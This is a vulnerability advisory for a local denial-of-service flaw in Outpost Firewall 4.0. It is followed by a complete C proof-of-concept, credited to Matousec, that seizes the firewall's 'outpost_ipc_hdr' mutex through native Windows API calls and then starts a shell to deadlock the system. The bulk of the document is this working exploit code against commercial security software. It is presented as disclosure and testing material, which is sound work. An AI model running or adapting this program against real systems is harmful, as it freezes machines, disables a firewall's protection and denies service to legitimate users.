source: http://www.securityfocus.com/bid/24284/info

Outpost Firewall is prone to a local denial-of-service vulnerability.

An attacker can exploit this issue to block arbitrary processes, denying service to legitimate users.

This issue affects Outpost Firewall 4.0 build 1007.591.145 and build 964.582.059; other versions may also be affected. 

/*

 Testing program for Enforcing system reboot with \"outpost_ipc_hdr\" mutex (BTP00002P004AO)
 

 Usage:
 prog
   (the program is executed without special arguments)

 Description:
 This program calls standard Windows API to open and capture mutex. Then an attempt to create a child process 
 causes the deadlock. To terminate this testing program and to release the mutex press Ctrl+C.

 Test:
 Running the testing program.

*/

#include <stdio.h>
#include <windows.h>
#include <ddk/ntapi.h>

void about(void)
{
  printf("Testing program for Enforcing system reboot with \"outpost_ipc_hdr\" mutex (BTP00002P004AO)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test\n"
         "  (the program is executed without special arguments)\n");
  return;
}


void print_last_error()
{
  LPTSTR buf;
  DWORD code=GetLastError();
  if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,code,0,(LPTSTR)&buf,0,NULL))
  {
    fprintf(stderr,"Error code: %ld\n",code);
    fprintf(stderr,"Error message: %s",buf);
    LocalFree(buf);
  } else fprintf(stderr,"Unable to format error message for code %ld.\n",code);
  return;
}


HANDLE capture_mutex(char *name)
{
  wchar_t namew[MAX_PATH];
  snwprintf(namew,MAX_PATH,L"%S",name);
  UNICODE_STRING uniname;
  RtlInitUnicodeString(&uniname,namew);

  OBJECT_ATTRIBUTES oa;
  InitializeObjectAttributes(&oa,&uniname,OBJ_CASE_INSENSITIVE | OBJ_OPENIF,0,NULL);
  HANDLE mutex;
  DWORD access=MUTANT_ALL_ACCESS;
  NTSTATUS status=ZwOpenMutant(&mutex,access,&oa);
  if (!NT_SUCCESS(status)) return 0;
  printf("Mutex opened.\n");
  if (WaitForSingleObject(mutex,5000)==WAIT_OBJECT_0) return mutex;
  ZwClose(mutex);
  return NULL;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=1)
  {
    usage();
    return 1;
  }

  while (1)
  {
    HANDLE mutex=capture_mutex("\\BaseNamedObjects\\outpost_ipc_hdr");
    if (mutex)
    {
      printf("Mutex captured.\n"
             "Running system shell. This action will block the system.\n");

      WinExec("cmd",SW_NORMAL);
    } else
    {
      fprintf(stderr,"Unable to capture \"outpost_ipc_hdr\" mutex.\n");
      break;
    }
  }

  printf("\nTEST FAILED!\n");
  return 1;
}